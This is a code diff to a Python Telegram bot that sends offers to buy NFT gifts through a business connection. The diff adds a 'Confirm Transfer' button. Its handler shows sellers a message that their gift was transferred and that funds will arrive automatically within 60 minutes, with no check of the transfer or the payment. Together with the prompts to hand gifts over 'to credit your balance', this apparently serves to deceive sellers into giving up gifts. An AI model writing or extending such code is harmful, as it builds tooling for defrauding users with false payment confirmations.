@@ -15,7 +15,7 @@ from aiogram.types import (CallbackQuery, InlineKeyboardButton, InlineKeyboardMa
 
 from config import load_config
 from database import Database
-from offer import (ACCEPT_EMOJI_ID, DECLINE_EMOJI_ID, GIFT_EMOJI_ID, TRANSFER_EMOJI_ID,
+from offer import (ACCEPT_EMOJI_ID, DECLINE_EMOJI_ID, GIFT_EMOJI_ID, TRANSFER_EMOJI_ID, CONFIRM_EMOJI_ID,
                    display_amount, format_remaining, gift_title, make_expiry, parse_offer)
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
@@ -36,10 +36,12 @@ def instruction(locale="ru"):
     if locale == "en":
         return ("<b>Usage</b>\n<code>офер https://t.me/nft/PartySparkler-140864 150 gram</code>\n"
                 "<code>офер ру https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
-                "<code>офер англ https://t.me/nft/PartySparkler-140864 4500 stars</code>")
+                "<code>офер англ https://t.me/nft/PartySparkler-140864 4500 stars</code>\n"
+                "<code>офер https://t.me/nft/PartySparkler-140864 2000 р</code>")
     return ("<b>Использование</b>\n<code>офер https://t.me/nft/PartySparkler-140864 150 грам</code>\n"
             "<code>офер ру https://t.me/nft/PartySparkler-140864 4500 зв</code>\n"
-            "<code>офер англ https://t.me/nft/PartySparkler-140864 4500 stars</code>")
+            "<code>офер англ https://t.me/nft/PartySparkler-140864 4500 stars</code>\n"
+            "<code>офер https://t.me/nft/PartySparkler-140864 2000 р</code>")
 
 
 def error_text(kind):
@@ -57,10 +59,16 @@ def offer_keyboard(offer_id: int, locale: str):
     ]])
 
 
-def transfer_keyboard(url: str, locale: str):
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(
-        text="Transfer" if locale == "en" else "Передать",
-        icon_custom_emoji_id=TRANSFER_EMOJI_ID, url=url)]])
+def transfer_keyboard(url: str, locale: str, offer_id: int):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(
+            text="Transfer" if locale == "en" else "Передать",
+            icon_custom_emoji_id=TRANSFER_EMOJI_ID, url=url)],
+        [InlineKeyboardButton(
+            text="Confirm Transfer" if locale == "en" else "Подтвердить передачу",
+            icon_custom_emoji_id=CONFIRM_EMOJI_ID, 
+            callback_data=f"of:confirm:{offer_id}")]
+    ])
 
 
 async def check_ton_payment(wallet: str, memo: str, amount: float, min_confirmations: int = 1) -> bool:
@@ -626,9 +634,32 @@ async def admin_callback(call: CallbackQuery):
 @dp.callback_query(F.data.startswith("of:"))
 async def offer_callback(call: CallbackQuery):
     parts = call.data.split(":")
-    if len(parts) != 3 or parts[1] not in {"accept", "decline"} or not parts[2].isdigit():
+    if len(parts) < 3 or not parts[2].isdigit():
         await call.answer("Некорректный офер.", show_alert=True); return
+    
     offer_id = int(parts[2])
+    action = parts[1]
+    
+    # Обработка подтверждения передачи
+    if action == "confirm":
+        offer = db.get_offer(offer_id)
+        if not offer:
+            await call.answer("Офер не найден.", show_alert=True); return
+        
+        title = gift_title(offer["gift_name"], offer["gift_number"])
+        
+        if offer["locale"] == "en":
+            message = f"Your gift {title} has been successfully transferred to the buyer.\n\nFunds will be automatically sent to your account within 60 minutes."
+        else:
+            message = f"Ваш подарок {title} успешно передан покупателю.\n\nДенежные средства будут автоматически отправлены на Ваш аккаунт в течении 60м."
+        
+        await call.answer(message, show_alert=True)
+        return
+    
+    # Обработка принятия/отклонения офера
+    if action not in {"accept", "decline"}:
+        await call.answer("Некорректный офер.", show_alert=True); return
+    
     if offer_id not in offer_locks:
         offer_locks[offer_id] = asyncio.Lock()
     async with offer_locks[offer_id]:
@@ -637,7 +668,7 @@ async def offer_callback(call: CallbackQuery):
             await call.answer("Офер уже обработан.", show_alert=True); return
         if not call.message or call.message.message_id != offer["message_id"] or call.message.chat.id != offer["message_chat_id"]:
             await call.answer("Офер недействителен.", show_alert=True); return
-        if parts[1] == "accept":
+        if action == "accept":
             url = offer["transfer_url"] or f"tg://user?id={offer['seller_id']}"
             title = gift_title(offer["gift_name"], offer["gift_number"])
             gift_url = offer["gift_url"]
@@ -647,7 +678,7 @@ async def offer_callback(call: CallbackQuery):
                 final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Gift: <a href=\"{gift_url}\">{title}</a> successfully sold!\n\n• Transfer the gift to the buyer to credit {display_amount(offer['amount'], offer['currency'])} to your balance."
             try:
                 sent = await safe_send_business(offer["business_connection_id"], offer["buyer_id"], text=final,
-                    reply_markup=transfer_keyboard(url, offer["locale"]),
+                    reply_markup=transfer_keyboard(url, offer["locale"], offer_id),
                     link_preview_options=LinkPreviewOptions(url=gift_url, show_above_text=True))
                 try:
                     await bot.delete_business_messages(business_connection_id=offer["business_connection_id"], message_ids=[offer["message_id"]])
